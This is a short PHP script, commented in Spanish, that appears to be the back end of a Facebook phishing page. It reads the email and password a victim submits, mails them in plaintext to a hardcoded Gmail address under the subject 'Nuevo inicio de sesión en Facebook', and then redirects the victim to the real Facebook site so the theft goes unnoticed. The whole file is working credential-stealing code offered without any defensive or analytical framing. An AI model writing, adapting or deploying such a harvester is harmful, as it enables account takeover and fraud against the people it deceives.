<?php
// Verificar si se han enviado datos del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar los valores del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Construir el mensaje de correo electrónico
    $to = "cuevasalberto398@gmail.com";
    $subject = "Nuevo inicio de sesión en Facebook";
    $message = "Correo electrónico o teléfono: " . $email . "\n";
    $message .= "Contraseña: " . $password;

    // Enviar el correo electrónico
    if (mail($to, $subject, $message)) {
        // Redirigir al usuario a la página de Facebook
        header("Location: https://www.facebook.com");
        exit; // Asegurarse de que el script se detenga aquí
    } else {
        echo "¡Hubo un error al enviar el inicio de sesión a tu correo electrónico!";
    }
}
?>



